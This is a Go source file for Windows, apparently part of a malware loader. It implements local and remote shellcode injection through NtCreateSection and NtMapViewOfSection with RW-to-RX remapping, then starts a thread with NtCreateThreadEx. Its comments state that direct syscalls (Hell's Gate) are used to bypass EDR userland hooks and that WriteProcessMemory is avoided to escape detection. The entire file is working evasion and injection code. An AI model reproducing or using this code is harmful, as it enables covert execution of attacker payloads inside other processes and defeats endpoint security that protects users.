//go:build windows

package main

import (
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	secCommit   uintptr = 0x8000000
	secNoChange uintptr = 0x0400000
	viewShare   uintptr = 1
)

// mapInjectLocal executes shellcode in the current process via a mapped section.
//
// Technique: NtCreateSection → NtMapViewOfSection(RW, self) → copy shellcode →
//            NtUnmapViewOfSection → NtMapViewOfSection(RX, self) → NtCreateThreadEx.
//
// No VirtualAlloc, no WriteProcessMemory — all NT calls issued via direct syscall
// (Hell's Gate) to bypass EDR userland hooks.
func mapInjectLocal(shellcode []byte) error {
	if len(shellcode) == 0 {
		return fmt.Errorf("empty shellcode")
	}

	hSelf := windows.CurrentProcess()

	hSection, err := ntCreateSec(uintptr(len(shellcode)), pageExecuteReadWrite)
	if err != nil {
		return err
	}
	defer windows.CloseHandle(hSection)

	// Map RW view locally to write shellcode.
	localBase, err := ntMapView(hSection, hSelf, uintptr(len(shellcode)), pageReadWrite)
	if err != nil {
		return err
	}

	dst := unsafe.Slice((*byte)(unsafe.Pointer(localBase)), len(shellcode))
	copy(dst, shellcode)

	ntUnmap(hSelf, localBase)

	// Remap as RX for execution.
	rxBase, err := ntMapView(hSection, hSelf, uintptr(len(shellcode)), pageExecRead)
	if err != nil {
		return err
	}

	hThread, err := ntCreateThread(hSelf, rxBase)
	if err != nil {
		ntUnmap(hSelf, rxBase)
		return err
	}
	windows.CloseHandle(hThread)
	return nil
}

// mapInjectRemote injects shellcode into pid via cross-process section mapping.
//
// Technique: NtCreateSection → NtMapViewOfSection(RW, self) → copy shellcode →
//            NtUnmapViewOfSection(self) → NtMapViewOfSection(RX, remote) →
//            NtCreateThreadEx(remote).
//
// No WriteProcessMemory is ever called — avoids one of the most-scrutinised
// injection indicators. All NT calls bypass userland hooks via Hell's Gate.
func mapInjectRemote(pid uint32, shellcode []byte) error {
	if len(shellcode) == 0 {
		return fmt.Errorf("empty shellcode")
	}

	hSelf := windows.CurrentProcess()

	hSection, err := ntCreateSec(uintptr(len(shellcode)), pageExecuteReadWrite)
	if err != nil {
		return err
	}
	defer windows.CloseHandle(hSection)

	// Map RW view locally to write shellcode (no WriteProcessMemory).
	localBase, err := ntMapView(hSection, hSelf, uintptr(len(shellcode)), pageReadWrite)
	if err != nil {
		return err
	}

	dst := unsafe.Slice((*byte)(unsafe.Pointer(localBase)), len(shellcode))
	copy(dst, shellcode)

	ntUnmap(hSelf, localBase)

	// Open target process.
	hProc, err := windows.OpenProcess(processAllAccess, false, pid)
	if err != nil {
		return fmt.Errorf("OpenProcess(%d): %w", pid, err)
	}
	defer windows.CloseHandle(hProc)

	// Map RX view into the remote process (shared section — no data copy across boundary).
	remoteBase, err := ntMapView(hSection, hProc, uintptr(len(shellcode)), pageExecRead)
	if err != nil {
		return err
	}

	hThread, err := ntCreateThread(hProc, remoteBase)
	if err != nil {
		ntUnmap(hProc, remoteBase)
		return err
	}
	windows.CloseHandle(hThread)
	return nil
}
